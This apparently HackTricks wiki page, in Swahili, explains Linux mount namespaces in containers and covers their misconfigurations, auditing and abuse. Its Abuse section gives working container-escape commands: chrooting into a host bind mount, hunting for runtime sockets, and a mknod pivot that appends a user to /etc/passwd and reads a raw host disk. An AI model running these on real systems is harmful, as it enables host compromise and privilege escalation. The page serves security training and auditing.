# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Mount namespace hudhibiti **mount table** ambayo process huiona. Hiki ni kipengele muhimu sana cha container isolation kwa sababu root filesystem, bind mounts, tmpfs mounts, mwonekano wa procfs, ufichuaji wa sysfs, na helper mounts nyingi maalum za runtime zote huwakilishwa kupitia mount table hiyo. Processes mbili zinaweza zote kufikia `/`, `/proc`, `/sys`, au `/tmp`, lakini paths hizo zinaelekeza kwenye vitu gani hutegemea mount namespace zilizo ndani yake.

Kwa mtazamo wa container-security, mount namespace mara nyingi ndiyo tofauti kati ya "hii ni application filesystem iliyoandaliwa vizuri" na "process hii inaweza kuona au kuathiri moja kwa moja host filesystem". Ndiyo sababu bind mounts, `hostPath` volumes, privileged mount operations, na ufichuaji wa `/proc` au `/sys` unaoweza kuandikwa yote huzunguka namespace hii.

## Uendeshaji

Runtime inapozindua container, kwa kawaida huunda mount namespace mpya, huandaa root filesystem ya container, hu-mount procfs na helper filesystems nyingine inapohitajika, kisha kwa hiari huongeza bind mounts, tmpfs mounts, secrets, config maps, au host paths. Baada ya process hiyo kuanza kufanya kazi ndani ya namespace, seti ya mounts inayoiona huwa kwa kiasi kikubwa imetenganishwa na mwonekano wa kawaida wa host. Host bado inaweza kuona filesystem halisi iliyo chini, lakini container huona toleo lililoandaliwa kwa ajili yake na runtime.

Hii ina nguvu kwa sababu inairuhusu container kuamini kuwa ina root filesystem yake, ingawa host bado inadhibiti kila kitu. Pia ni hatari kwa sababu runtime ikifichua mount isiyofaa, process hupata ghafla mwonekano wa host resources ambazo huenda security model yote haikuundwa kuzilinda.

## Lab

Unaweza kuunda private mount namespace kwa:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ukifungua shell nyingine nje ya namespace hiyo na kukagua mount table, utaona kwamba tmpfs mount ipo ndani ya isolated mount namespace pekee. Hili ni zoezi muhimu kwa sababu linaonyesha kwamba mount isolation si nadharia dhahania; kernel inawasilisha mount table tofauti kihalisi kwa process.

Ukifungua shell nyingine nje ya namespace hiyo na kukagua mount table, tmpfs mount itakuwepo ndani ya isolated mount namespace pekee.

Ndani ya containers, ulinganisho wa haraka ni:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Mfano wa pili unaonyesha jinsi ilivyo rahisi kwa runtime configuration kutoboa pengo kubwa kupitia mpaka wa filesystem.

## Matumizi ya Runtime

Docker, Podman, stacks zinazotegemea containerd, na CRI-O zote hutegemea private mount namespace kwa containers za kawaida. Kubernetes hujenga juu ya mechanism hiyo hiyo kwa volumes, projected secrets, config maps, na mounts za `hostPath`. Mazingira ya Incus/LXC pia hutegemea sana mount namespaces, hasa kwa sababu system containers mara nyingi huonyesha filesystems zilizo pana na zinazofanana zaidi na za mashine kuliko application containers.

Hii inamaanisha kwamba unapokagua tatizo la container filesystem, kwa kawaida huangalii hitilafu ya Docker iliyojitenga. Unaangalia tatizo la mount-namespace na runtime-configuration linaloonyeshwa kupitia platform yoyote iliyozindua workload hiyo.

## Misconfigurations

Kosa lililo wazi zaidi na hatari zaidi ni kuonyesha host root filesystem au host path nyingine nyeti kupitia bind mount, kwa mfano `-v /:/host` au `hostPath` inayoweza kuandikwa katika Kubernetes. Kufikia hapo, swali si tena "je, container inaweza kwa namna fulani escape?" bali "ni kiasi gani cha host content muhimu ambacho tayari kinaonekana na kinaweza kuandikwa moja kwa moja?" Writable host bind mount mara nyingi hugeuza sehemu iliyobaki ya exploit kuwa suala rahisi la kuweka mafaili, kutumia chroot, kubadilisha config, au kugundua runtime socket.

Tatizo lingine la kawaida ni kuonyesha host `/proc` au `/sys` kwa njia zinazopita container view iliyo salama zaidi. Filesystems hizi si data mounts za kawaida; ni interfaces zinazoingia kwenye hali ya kernel na process. Ikiwa workload inaweza kufikia versions za host moja kwa moja, assumptions nyingi zilizo nyuma ya container hardening huacha kutumika kwa usahihi.

Protections za read-only pia ni muhimu. Read-only root filesystem haiwezi kulinda container kimuujiza, lakini huondoa nafasi kubwa ya attacker staging na hufanya persistence, uwekaji wa helper-binary, na config tampering kuwa vigumu zaidi. Kinyume chake, root inayoweza kuandikwa au writable host bind mount humpa attacker nafasi ya kuandaa hatua inayofuata.

## Abuse

Mount namespace inapotumiwa vibaya, attackers kwa kawaida hufanya mojawapo ya mambo manne. **Husoma host data** ambayo ilipaswa kubaki nje ya container. **Hubadilisha host configuration** kupitia writable bind mounts. **Hu-mount au hu-remount resources za ziada** ikiwa capabilities na seccomp zinaruhusu. Au **hufikia sockets zenye nguvu na runtime state directories** zinazowaruhusu kuiomba container platform yenyewe iwape access zaidi.

Ikiwa container tayari inaweza kuona host filesystem, security model yote hubadilika mara moja.

Unaposhuku kuwepo kwa host bind mount, kwanza thibitisha kile kinachopatikana na kama kinaweza kuandikwa:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ikiwa root filesystem ya host imewekwa kwa read-write, ufikiaji wa moja kwa moja wa host mara nyingi huwa rahisi kama:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ikiwa lengo ni privileged runtime access badala ya direct chrooting, enumerate sockets na runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ikiwa `CAP_SYS_ADMIN` ipo, pia jaribu kama mounts mpya zinaweza kuundwa kutoka ndani ya container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Mfano Kamili: Two-Shell `mknod` Pivot

Njia maalum zaidi ya abuse hujitokeza wakati container root user anaweza kuunda block devices, host na container zinashiriki user identity kwa njia inayofaa, na attacker tayari ana foothold ya low-privilege kwenye host. Katika hali hiyo, container inaweza kuunda device node kama `/dev/sda`, na low-privilege host user anaweza kuisoma baadaye kupitia `/proc/<pid>/root/` kwa container process inayolingana.<sup>[[1]](#references)</sup>

Ndani ya container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Kutoka kwenye host, ukiwa mtumiaji wa low-privilege anayelingana baada ya kupata PID ya container shell:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Somo muhimu si utafutaji halisi wa string ya CTF. Ni kwamba exposure ya mount-namespace kupitia `/proc/<pid>/root/` inaweza kumruhusu mtumiaji wa host kutumia tena device nodes zilizoundwa na container, hata wakati cgroup device policy ilizuia matumizi ya moja kwa moja ndani ya container yenyewe.<sup>[[1]](#references)</sup>

## Ukaguzi

Amri hizi zipo ili kukuonyesha filesystem view ambayo process ya sasa inaishi ndani yake. Lengo ni kubaini mounts zilizotokana na host, paths nyeti zinazoweza kuandikwa, na kitu chochote kinachoonekana kuwa kipana zaidi kuliko root filesystem ya kawaida ya application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Ni nini kinachovutia hapa:

- Bind mounts kutoka kwa host, hasa `/`, `/proc`, `/sys`, directories za runtime state, au maeneo ya socket, zinapaswa kuonekana mara moja.
- Mounts zisizotarajiwa za kusoma-kuandika kwa kawaida ni muhimu zaidi kuliko idadi kubwa ya mounts za kusaidia za kusoma-tu.
- `mountinfo` mara nyingi ndiyo sehemu bora ya kuona ikiwa path imetokana na host au inaungwa mkono na overlay.

Ukaguzi huu huonyesha **ni rasilimali zipi zinaonekana katika namespace hii**, **ni zipi zimetokana na host**, na **ni zipi zinaweza kuandikwa au ni nyeti kiusalama**.

## Marejeleo

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
